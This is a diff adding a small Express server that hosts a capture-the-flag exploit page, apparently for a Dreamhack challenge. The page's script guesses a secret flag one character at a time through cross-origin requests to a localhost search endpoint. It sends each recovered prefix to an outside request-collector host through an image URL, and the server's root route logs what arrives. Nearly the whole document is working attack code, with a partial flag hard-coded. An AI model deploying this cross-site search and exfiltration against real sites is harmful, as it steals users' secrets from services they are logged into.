@@ -1,3 +1,17 @@
+var express = require('express');
+var url = require('url');
+var app = express();
+
+app.use(express.urlencoded({extended:true}))
+
+app.get('/', (req, res) => {
+  param = decodeURI(url.parse(req.url).search).substr(1);
+  console.log("/?", param);
+  res.send('thx');
+});
+
+app.get('/welcome', (req, res) => {
+  res.send(`
 <iframe id="iframe"></iframe>
 <img id="img">
 <script>
@@ -13,32 +27,30 @@
             };
         });
     }
-
     async function search(query) {
         try {
             await req(
-              `http://localhost:8000/search?query=${query}`
+              \`http://localhost:8000/search?query=\${query}\`
             );
             return true;
         } catch (e) {
             return false;
         }
     }
-
     async function exploit() {
         let chars = "0123456789abcdef}"
-        let secret = "DH{";
-
+        let secret = "DH{22d1445ad68e194e044a16dc644371";
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://kjbpgjo.request.dreamhack.games/${secret}`;
+                    img.src = \`https://kjbpgjo.request.dreamhack.games/?\${secret}\`;
                     break;
                 }
             }
         }
     }
-
     exploit();
 </script>
+  `);
+});
